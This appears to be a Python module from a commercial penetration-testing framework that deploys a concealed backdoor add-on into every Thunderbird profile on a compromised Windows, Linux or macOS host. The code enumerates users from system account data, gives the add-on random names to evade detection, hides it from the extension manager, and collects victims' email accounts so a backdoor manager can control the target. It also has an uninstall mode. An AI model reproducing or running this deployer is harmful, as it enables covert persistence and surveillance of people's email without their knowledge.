#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

#TODO:
# - check that thunderbird on target is 3.1 to be sure backdoor will work
# - some cleanup on js.template to remove comments and unnecessary lines

from __future__ import with_statement
import sys
import os
import traceback
import uuid
import shutil
import json
import urllib2
import re
import base64
from random import choice
from ConfigParser import SafeConfigParser
import xml.etree.cElementTree as cET

try:
   import cPickle as pickle
except Exception:
   import pickle


if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from canvaserror import *
from exploitmanager import *
from engine.config import canvas_resources_directory
from ExploitTypes.localcommand import LocalCommand

NAME                  = "Mozilla Thunderbird Backdoor Deployer"
VERSION               = "1.0"
DESCRIPTION           = "Mozilla Thunderbird Backdoor Deployer."
DOCUMENTATION         = {}
DOCUMENTATION["Info"] = """
Deploys or Uninstall Mozilla Thunderbird Backdoor on all user profiles.

First all target user accounts are detected and then scanned for Thunderbird profiles. 
If "uninstall" mode

If "deploy" mode is selected a new addon will be installed on all detected Thunderbird
profiles using the backdoor type specified.

There are 2 backdoor types: normal and debug.
Debug type works just as the normal, providing the same feature, but with additional
logging on the target. A log file called "nsIBkdManager.log" is created on the Thunderbird
profile directory.
The debug type should only be used for testing or when normal type
is not working as expected and further details are needed to find the underlying issue.

"""
PROPERTY              = {}
PROPERTY['TYPE']      = "Trojans"
PROPERTY['SITE']      = "Local"
PROPERTY['ARCH']      = [ ["Windows", "Linux", "OSX"]  ]
MODULE_DIR            = os.path.abspath(os.path.dirname(__file__))
BKD_RESOURCE_DIR      = os.path.abspath(os.path.join(canvas_resources_directory , "thunderbird_backdoor/"))
ADDONS_DIALOG_GLADE   = os.path.join(MODULE_DIR , "addons_dialog.glade2")
EXTENSION_DIR         = os.path.join(MODULE_DIR , "extension/")

class theexploit(LocalCommand):
    def __init__(self):
        # structure of the self.user dict is:
        # username (dict)
        #     |--> "appdata" (full path to user application data dir. In linux this is the home)
        #     |--> "home" (full path to user home dir)
        #     |--> "config_dir"  (full path to the TB config dir)
        #     |--> "tb_profiles" (dict)
        #               |--> profile name (dict)
        #                      |--> "path"
        #                      |--> "backdoored" (bool)
        #                      |--> "backdoor_path" (contains full path to backdoor addon)
        
        # --- DEPRECATED ---
        #                      |--> "extensions" (dict)
        #                               |--> addon name
        #                                       |--> "id"
        #                                       |--> "path"
        #                                       |--> "name"
        #                                       |--> "description"
        #                                       |--> "injected"
        LocalCommand.__init__(self)
        self.name               = NAME
        self.users              = {}
        self.node               = None
        self.session_dir        = "."
        self.target_ip          = ""
        self.email_accounts     = [] # will contain all the email account of the injected victim
        self.supportedNodeArgs  = ["win32Node", "win64Node", "linuxNode", "osxNode"]
        
        # platform dependant thunderbird dir
        self.tb_config_dir      = {
            "win32Node" : ["<APPDATA>", "Thunderbird"],
            "win64Node" : ["<APPDATA>", "Thunderbird"],
            "linuxNode" : ["<HOME>", ".thunderbird"],
            "osxNode"   : ["<HOME>", "Library", "Thunderbird"],
        }
        
        self.chrome_regex       = None
        self.result             = False
        self.backdoortype_value = "normal"
        self.uninstall          = False
        self.bkd_uuid_regex     = re.compile("<em:id>(.*)</em:id>")
        
        if not os.path.exists(BKD_RESOURCE_DIR): os.mkdir(BKD_RESOURCE_DIR)
        
    def fix_path(self, path, add_trail_slash=False):
        """
        Fixes path according to the target platform
        """
        separator = "/"
        if self.node.nodetype in ("win32Node", "win64Node"):
            separator = "\\"
        
        if os.path.sep != separator:
            path = path.replace(os.path.sep, separator)
        
        if add_trail_slash:
            path += separator
            
        return path.strip()
    
    def get_random_str(self, length):
        return ''.join([choice(string.letters) for i in xrange(length)])

    def get_home_dir(self, username):
        return self.users[username]["home"]
        
    def get_appdata_dir(self, username):
        return self.users[username]["appdata"]
    
    def get_thunderbird_config_dir(self, username):
        appdata_dir                        = self.get_appdata_dir(username)
        dir                                = self.tb_config_dir[self.node.nodetype]
        dir[0]                             = appdata_dir
        conf_dir                           = os.path.join(*dir)
        self.users[username]["config_dir"] = self.fix_path(conf_dir)

    def get_target_users(self):
        """
        Depending on the target platform we try to get all user profiles.
        Returns a dictionary with all users. Dictionary elements have two
        keys, home and appdata.
        """
        users = {}
        
        if self.node.nodetype in ("win32Node", "win64Node"):
            target_users = self.node.shell.NetUserEnum()
            system_drive = self.node.shell.GetEnvironmentVariable("SystemDrive")
            self.node.shell.chdir(system_drive) # do it for future use
            userprofile_dir = self.node.shell.GetEnvironmentVariable("USERPROFILE").strip().decode("utf-8")
            # some processes may not have appdata variable (i.e.: processes running with SYSTEM account)
            # some options? http://www.adminxp.com/windowsvista/index.php?aid=235
            # use known folder ids with some APIs http://msdn.microsoft.com/en-us/library/bb762584(VS.85).aspx
            # and maybe add some code to win shell servers
            appdata_dir = self.node.shell.GetEnvironmentVariable("APPDATA").strip().decode("utf-8")
            for username in target_users:
                # usernames retrieved with NetUserEnum are in unicode...
                try:
                    username = username.decode("utf_16_le")
                except Exception:
                    self.log('Error when unicode decoding username.')
                    continue
                t                          = userprofile_dir.split("\\")[-1]
                users[username]            = {}
                users[username]["home"]    = userprofile_dir.replace(t, username)
                users[username]["appdata"] = appdata_dir.replace(t, username)
                    
        elif self.node.nodetype == "linuxNode":
            etc_passwd = self.node.runcommand("cat /etc/passwd")
            # parsing this output we'll know all users and their home paths
            # format is: Username:Password:UID:GID:User ID Info:Home directory:shell
            for line in etc_passwd.splitlines():
                username, password, uid,\
                gid, info, home, shell_path = line.split(":")
                
                users[username]            = {}
                users[username]["home"]    = home
                users[username]["appdata"] = home
            
        elif self.node.nodetype == "osxNode":
            user_list = self.node.runcommand("dscl . -list /Users NFSHomeDirectory")
            for line in user_list.splitlines():
                username, home = map(lambda x: x.split()[0], line.split())
                if home != "/var/empty":
                    users[username]            = {}
                    users[username]["home"]    = home
                    users[username]["appdata"] = home
        return users


    def load_chrome_regex(self):
        with open(os.path.join(EXTENSION_DIR, "chrome.manifest.regex"), "r") as f:
            regex = f.read().strip()
            self.chrome_regex = re.compile(regex)
    
        
    def check_thunderbird_version(self, dir):
        """
        Download compatibility.ini from the profile dir and then read the LastVersion field.
        Return False on error or (major, minor) version numbers.
        """
        try:
            self.node.shell.chdir(dir)
            self.node.download("compatibility.ini", self.compatibility_path)
        except NodeCommandError:
            return False
  
        profiles_config = SafeConfigParser()
        profiles_config.read(self.compatibility_path)
        profile_sections = [s for s in profiles_config.sections() if "Compatibility" in s]
        if not profile_sections: return False
        # Read first section
        section = profile_sections[0]
        version = profiles_config.get(section, 'LastVersion')
        try:
            major, minor = version.split('.')[0:2]
            return (int(major), int(minor))
        except Exception:
            return False
    
    def extensions_path_decode(self, encoded_str):
        """
        On OSX the extensions.ini file doesn't contain plain text string for the
        extensions path. A base64 encoded string. When decoding that string
        a particular format is used. This header(pattern) "\x00H\x00D\x00\x12\x00"
        delimits the part of the record that contains the path value, and the first
        char after that header determines the length of the path value.
        """
        path = encoded_str
        try:
            if self.node.nodetype == "osxNode":
                decoded_str = base64.decodestring(encoded_str)
                pos = decoded_str.find("\x00H\x00D\x00\x12\x00")
                if pos != -1:
                    pos += 7
                    lenght = ord(decoded_str[pos])
                    pos += 1
                    path = decoded_str[pos:pos+lenght]
                    if path[0] != "/":
                        path = "/" + path
                    self.log("Decoded path '%s' from extensions.ini" % path)
                else:
                    self.log("Didn't find required header to decode OSX extension path")
        except Exception, ex:
            self.log("An error ocurred while decoding an OSX extension path\n"
                     "Description: %s" % str(ex))
        
        return path
    
    def check_backdoor_exists(self, username):
        """
        Checks all the installed extensions on all the thunderbird profiles
        for the passed username by parsing each chrome.manifest.
        If our backdoor addon pattern is detected it populates the users[tb_profile]
        structure to store info for later use. Returns True if at least one thunderbird
        profile for the selected user contains the backdoor.
        Returns False otherwise
        """
        ns    = "http://www.mozilla.org/2004/em-rdf#"
        tags  = ("id", "name", "description", "version")
        found = False
        for pname, pinfo in self.users[username]["tb_profiles"].iteritems():
            self.node.shell.chdir(pinfo["path"]) # check if worked ?
            try:
                self.node.download("extensions.ini", self.extensions_path)
            except NodeCommandError, e:
                continue

            ext_config = SafeConfigParser()
            ext_config.read(self.extensions_path)
            
            for k, v in ext_config.items("ExtensionDirs"):
                # v contains fullpath to the extension
                # in order to get info about each installed addon we need to read thier install.rdf
                v = self.extensions_path_decode(v) # osx needs decoding
                self.node.shell.chdir(v)
                try:
                    self.node.download("chrome.manifest", self.chrome_path)
                except NodeCommandError, e:
                    continue
                
                # By parsing chrome.manifest we can detect if it already has the backdoor.
                # When we inject the last 3 lines of the chrome manifest contain our
                # backdoor overlays according to chrome.manifest.template file.
                with open(self.chrome_path, "r") as fchrome: chrome_content = fchrome.read()
                match = self.chrome_regex.search(chrome_content)
                if match is not None:
                    self.log('User %s already has Thunderbird backdoor installed in profile: %s' % (username, pname))
                    pinfo["backdoored"] = True
                    pinfo["backdoor_path"] = v
                    found = True

        return found
                

    def get_thunderbird_profiles(self, username):
        """
        Read information from profile.ini for a particular user
        And extract information about each profile.
        """
        found = False
        self.users[username]["tb_profiles"] = {}
        # depending on the target platform we download the
        # profiles.ini from a different place
        self.get_thunderbird_config_dir(username)        
        config_dir = self.users[username]["config_dir"]
        res = self.node.shell.chdir(config_dir)
        
        # if chdir didn't work then tb folder may not exist
        if res != -1:
            try:
                self.node.download("profiles.ini", self.profiles_path)
            except NodeCommandError, e:
                return False
            
            profiles_config = SafeConfigParser()
            profiles_config.read(self.profiles_path)
            
            profile_sections = [s for s in profiles_config.sections() if "Profile" in s]
            self.log("Found profile sections %s" % profile_sections)
            for section in profile_sections:
                pname = profiles_config.get(section, "Name")
                ppath = profiles_config.get(section, "Path")
                relative = int(profiles_config.get(section, "IsRelative"))
                if relative:
                    ppath = os.path.join(config_dir, ppath)
                    ppath = self.fix_path(ppath)

                ver = self.check_thunderbird_version(ppath)

                if ver and ver[0] >= 3 and ver[1] >= 1:
                    self.log('Supported version of Thunderbird found, %d.%d' % ver)
                else:
                    self.log('This version of Thunderbird is not supported: %d.%d' % ver)
                    continue
                    
                self.users[username]["tb_profiles"][pname] = {}
                self.users[username]["tb_profiles"][pname]["path"] = ppath
                self.users[username]["tb_profiles"][pname]["backdoored"] = False
                self.users[username]["tb_profiles"][pname]["backdoor_path"] = ""
                
                #self.users[username]["tb_profiles"][pname]["extensions"] = {}
                self.log("Profile = %s\nName = %s\nPath = %s\nIsRelative = %s" %
                         (section, pname, ppath, relative))
                found = True 
        else:
            self.log("chdir to %s didn't work. Directory may not exist" % config_dir)

        return found
    
    def get_email_accounts(self, path):
        # we can extract info about addresses by reading the folderTree.json file
        try:
            self.node.shell.chdir(path)
            self.node.download("folderTree.json", self.foldertree_path)
        except NodeCommandError, e:
            return
        folders = []
        with open(self.foldertree_path) as f:
            folders = json.load(f)
            
        s = set()
        for l in folders.itervalues():
            try:
                [s.add(tuple(a.split("/")[2].split("@"))) for a in l]
            except Exception:
                continue
        
        # this will provide us with users and server names which will be used
        # to infer the email addresses
        all_accounts = []
        for user, server in s:
            if user != "nobody":
                account = (urllib2.unquote(user), urllib2.unquote(server))
                all_accounts.append(account)

        self.email_accounts.extend(all_accounts) # this could cause duplicates
        
    def log_email_accounts(self):
        """
        Show in the log the email accounts retrieved from injected thunderbird profiles        
        """
        if self.email_accounts:
            self.log("These are the emails configured in all Thunderbird profiles detected on the victim. "
                     "You can try using them with the backdoor manager in order to control the target:")
            for user, server in self.email_accounts:
                parts = server.split(".")
                if len(parts) >= 3:
                    server = ".".join(parts[1:])
                    email = user if "@" in user else "%s@%s" % (user, server)
                    self.log(email)
    
    def _rmdir(self, dirname):
        #XXX: since rmdir appears not to be implemented in all nodetypes at the moment
        # this is a workaround by running commands
        if self.node.nodetype in ("win32Node", "win64Node"):
            res = self.node.runcommand('RD /S /Q "%s"' % dirname)
        else:
            # both linux and osx have rm command
            res = self.node.runcommand('rm -rf "%s"' % dirname)
        
        
    def _mkdir(self, dirname):
        """
        Creates a new dir on the target and chdir to it
        """
        try:
            res1 = self.node.shell.mkdir(dirname)
        except Exception, e:
            # only mark res1 as failed if exception is not a "File exists" one
            res1 = str(e).find("File exists")
        try:
            res2 = self.node.shell.chdir(dirname)
        except Exception:
            res2 = -1
        return not(res1 == -1 or res2 == -1)

    def _prepare_file(self, repls, template_filename, real_filename):
        template_file = open(template_filename, "rt")
        template = template_file.read()
        template_file.close()
        real_file = open(real_filename, "wt")
        for r, v in repls.iteritems():
            template = template.replace(r, v)
        real_file.write(template)
        real_file.close()
        
    def _prepare_addon(self):
        """
        Using template files it creates uuids to use when deploying
        and updates contentes according to it.
        Any existing files are overwritten to ensure we use the right contents
        """
        # generate a random values for all things to avoid easy detection based on
        # file or folder names
        repls = {
            "[UUID]"        : "{%s}" % uuid.uuid4(),
            "[ADDONPATH]"   : "{%s}" % uuid.uuid4(),
            "[ADDONNAME]"   : self.get_random_str(8),
            "[JSNAME]"      : self.get_random_str(8),
            "[JSEXTNAME]"      : self.get_random_str(8),
            "[UPDATEURL]"   : "",
        }
        
        js_filename = "%s.js" % repls["[JSNAME]"]
        xul_filename = "%s-overlay.xul" % repls["[ADDONNAME]"]
        ext_xul_filename = "%s-overlay.xul" % repls["[JSEXTNAME]"]
        ext_js_filename = "%s.js" % repls["[JSEXTNAME]"]
        
        
        self._prepare_file(repls, os.path.join(EXTENSION_DIR, "install.rdf.template"),
                           os.path.join(EXTENSION_DIR, "install.rdf"))
        
        self._prepare_file(repls, os.path.join(EXTENSION_DIR, "chrome.manifest.template"),
                           os.path.join(EXTENSION_DIR, "chrome.manifest"))
        
        self._prepare_file(repls, os.path.join(EXTENSION_DIR, "content", "overlay.xul.template"),
                           os.path.join(EXTENSION_DIR, "content", xul_filename))
        
        self._prepare_file(repls, os.path.join(EXTENSION_DIR, "content", "extensions-overlay.xul.template"),
                           os.path.join(EXTENSION_DIR, "content", ext_xul_filename))
        
        js_template = "nsIBkdManager.js.%s" % self.backdoortype_value.lower()
        names = [ (js_template, js_filename),
                  ("extensions.js.template", ext_js_filename) ]
        
        
        # we use the templates to create a new js with the hardcoded uuid inside
        for template_name, fname in names:
            shutil.copy(os.path.join(EXTENSION_DIR, "content", template_name),
                        os.path.join(EXTENSION_DIR, "content", fname))
            
            js_file = open(os.path.join(EXTENSION_DIR, "content", fname), "a")
            js_file.write("var _nsIBkdID = \"%s\";\n\n" % repls["[UUID]"])
            js_file.close()
        
        return repls
    
    def clean_extension_dir(self, repls):
        """
        _prepare_addon method creates temp files we use to deploy.
        After using them we can safely remove them since we only need templates
        """
        delete_files = []
        delete_files.append("%s.js" % repls["[JSNAME]"])
        delete_files.append("%s-overlay.xul" % repls["[ADDONNAME]"])
        delete_files.append("%s-overlay.xul" % repls["[JSEXTNAME]"])
        delete_files.append("%s.js" % repls["[JSEXTNAME]"])
        delete_files.append(os.path.join(EXTENSION_DIR, "chrome.manifest"))
        delete_files.append(os.path.join(EXTENSION_DIR, "install.rdf"))
        for f in delete_files:
            try:
                os.remove(os.path.join(EXTENSION_DIR, "content", f))
            except Exception:
                pass
    
    def _upload_full_addon(self, repls, target_path, username):
        """
        Upload the full addon structure to the target path
        tb_profile_dir/
                extensions/
                    proxy_file
                    target_path/
                            content/
                                    bkd-overlay.xul
                                    nsIBkdManager.js
                            chrome.manifest
                            install.rdf
        """
        try:
            curdir = self.node.getcwd()
            addon_full_path = self.fix_path(os.path.join(curdir, target_path),
                                            add_trail_slash=True)
            self.log("Deploying full addon on path %s" % addon_full_path)
            # first of all deploy proxy file, which has to be named as the addon ID
            # and the content is the full path to the addon folder with trailing slash and no EOL
            proxy_file = os.path.join(self.session_dir, repls["[UUID]"])
            pf = open(proxy_file, "w")
            pf.write(addon_full_path)
            pf.close()
            self.node.upload(proxy_file, curdir, repls["[UUID]"])
            
            # target_path should not exist!
            if not self._mkdir(target_path):
                return False

            self.node.upload(os.path.join(EXTENSION_DIR, "chrome.manifest"),
                             target_path, "chrome.manifest")
            self.log("chrome.manifest uploaded")
            
            self.node.upload(os.path.join(EXTENSION_DIR, "install.rdf"),
                             target_path, "install.rdf")
            self.log("install.rdf uploaded")
            
            if not self._mkdir("content"):
                return False
            
            self._upload_small_addon(repls, target_path)
            
            # upload files needed to hide form extension manager
            tmp_repls = {}
            tmp_repls["[JSNAME]"] = repls["[JSEXTNAME]"]
            tmp_repls["[ADDONNAME]"] = repls["[JSEXTNAME]"]
            self._upload_small_addon(tmp_repls, target_path)
            
            # we need to change the owner to uploaded files just in case our node
            # is not being run with the user profile we injected here
            #if self.node.nodetype == "linuxNode":
            if self.node.nodetype in ("linuxNode", "osxNode"):
                self.log("Changing addon path permissions")
                self.node.shell.runcommand('chown -R %s: %s' % (username, addon_full_path))
                self.node.shell.runcommand('chown %s: %s' % (username, proxy_file))
            
            return True
        except Exception:
            self.log("An error ocurred when uploading full addon\n%s" % traceback.format_exc())
            return False

    def _upload_small_addon(self, repls, target_path):
        # This method should be called after chdir to the target dir
        # Only upload the files needed (js code and stub overlay to load the code)
        js_filename = "%s.js" % repls["[JSNAME]"]
        self.node.upload(os.path.join(EXTENSION_DIR, "content", js_filename),
                         target_path, js_filename)
        self.log("%s uploaded to %s" % (js_filename, target_path))
        
        xul_filename = "%s-overlay.xul" % repls["[ADDONNAME]"]
        self.node.upload(os.path.join(EXTENSION_DIR, "content", xul_filename),
                         target_path, xul_filename)
        self.log("%s uploaded to %s" % (xul_filename, target_path))
    
    def deploy_newaddon(self, username):
        # in this case we need to send the whole directory structure for the addon
        # then upload the proxy file inside the extension folder
        for pname, pinfo in self.users[username]["tb_profiles"].iteritems():
            self.log("Getting email accounts for thunderbird profile %s" % pname)
            self.get_email_accounts(pinfo["path"])
            repls = self._prepare_addon()
            ext_dir = self.fix_path(os.path.join(pinfo["path"], "extensions"))
            self.node.shell.chdir(ext_dir)
            res = self._upload_full_addon(repls, repls["[ADDONPATH]"], username)
            self.clean_extension_dir(repls)
            self.log('Uploaded new backdoor, user: %s, profile: %s' % (username, pname))
    
    def uninstall_addon(self, username):
        """
        Removes the addon from user located in remote path.
        In order to completely remove the backdoor the following files are deleted:
            - proxy file
            - complete backdoor folder (located ad path)
            - nsIBkdManager.dat (located on the profile folder)
            - nsIBkdManager.log (located on the profile folder)
        """
        self.log("Running uninstall for user %s" % username)
        for pname, pinfo in self.users[username]["tb_profiles"].iteritems():
            if pinfo["backdoored"]:
                try:
                    self.log("Profile %s contains a backdoor addon" % pname)
                    self.node.shell.chdir(pinfo["backdoor_path"])
                    self.node.download("install.rdf", self.installrdf_path)
                    
                    contents = ""
                    with open(self.installrdf_path) as f:
                        contents = f.read()
                        
                    m = self.bkd_uuid_regex.search(contents)
                    if m is not None:
                        proxy_uuid = m.group(1)
                        proxy_filepath = self.fix_path(os.path.join(pinfo["path"], "extensions", proxy_uuid))
                        # delete proxy file
                        self.node.unlink(proxy_filepath)
                        self.log("Proxy file '%s' deleted." % proxy_filepath)
                        
                    # delete addon folder
                    self.node.shell.chdir(pinfo["path"]) # move to a diff dir to avoid blocking the rmdir
                    self._rmdir(pinfo["backdoor_path"])
                    self.log("Addon directory '%s' deleted." % pinfo["backdoor_path"])

                    try:
                        # delete persistence file
                        persistence_path = self.fix_path(os.path.join(pinfo["path"], "nsIBkdManager.dat"))
                        self.node.unlink(persistence_path)
                        self.log("Persistence file '%s' deleted." % persistence_path)
                    except NodeCommandError, e:
                        pass
                    
                    try:
                        # delete log file if debug version was installed
                        log_path = self.fix_path(os.path.join(pinfo["path"], "nsIBkdManager.log"))
                        self.node.unlink(log_path)
                        self.log("Log file '%s' deleted." % log_path)
                    except NodeCommandError, e:
                        pass
                
                except Exception, ex:
                    self.log("An error ocurred while trying to uninstall backdoor "
                             "for Thunderbird profile %s on user %s\n"
                             "Description: %s" % (pname, username, str(ex)))
        
    
    def getArgs(self):
        "get module arguments"
        self.getarg("backdoortype_value")
        self.uninstall = ("uninstall" == self.argsDict.get("mode_value", "deploy").lower())
        if self.uninstall:
            self.log("Uninstall mode selected.")
        else:
            self.log("Deploy mode selected. Backdoor type %s" % self.backdoortype_value)
            
        try:
            self.node = self.argsDict["passednodes"][0]
        except Exception:
            self.node = None
        
    def run(self):    
        self.setInfo("Starting...")
        self.getArgs()
            
        if not self.node:
            self.setInfo('Failure, no node specified.')
            self.log("Can not run without a node, aborting.")
            return 0
        
        # The following are not arguments and should not be in getArgs
        # For command line considerations, anything with side-effects beyond
        # introducing new instance variables should be kept out of getArgs
        self.target_ip       = self.node.get_interesting_interface()
        self.session_dir     = self.output(self.target_ip, "Downloads")
        self.log("using session dir '%s' to store downloaded files" % self.session_dir)

        self.extensions_path    = os.path.join(self.session_dir, "extensions.ini")
        self.installrdf_path    = os.path.join(self.session_dir, "install.rdf")
        self.chrome_path        = os.path.join(self.session_dir, "chrome.manifest")
        self.profiles_path      = os.path.join(self.session_dir, "profiles.ini")
        self.foldertree_path    = os.path.join(self.session_dir, "folderTree.json")
        self.compatibility_path = os.path.join(self.session_dir, "compatibility.ini")
                        
        if self.node.nodetype not in self.supportedNodeArgs:
            self.setInfo('Failure, selected node is not supported.')
            self.log("Selected node is not supported.")
            return 0

        self.users = self.get_target_users()
        self.load_chrome_regex()

        if not self.users:
            self.log('Could not retrieve list of users from remote machine.')
            self.setInfo('Failure, could not retrieve list of users.')
            return 0
        
        deployed = False
        uninstalled = False
        # Go through the list of users we have, and deploy the
        # backdoor in version >= 3.1.x profiles 
        for user in self.users:
            if not self.get_thunderbird_profiles(user):
                self.log('User %s does not seem to have Thunderbird installed.' % user)
                continue
            
            if self.check_backdoor_exists(user):
                self.log("Previous backdoor instance detected on user %s" % user)
                if self.uninstall:
                    self.uninstall_addon(user)
                    uninstalled = True
                else:
                    self.log("Skipping user %s for deploy" % user)
                    
                continue # skip in case of deploy mode
            else:
                self.log("No previous backdoor instance detected on user %s" % user)
            
            if not self.uninstall:  
                self.log("Running deploy on user %s" % user)
                self.deploy_newaddon(user)
                deployed = True
        
        res = 0
        if self.uninstall:
            if uninstalled:
                msg = "Finished!\nBackdoor successfuly uninstalled. The addon will remain loaded in memory until Thunderbird is restarted."
                res = 1
            else:
                msg = 'No backdoor instance was detected'
        else:
            if deployed:
                self.log_email_accounts()
                msg = "Finished!\nBackdoor will start working when Thunderbird client is restarted."
                res = 1
            else:    
                msg = 'Failure! No backdoor deployed.'
        
        self.log(msg)
        self.setInfo(msg)
        return res

        
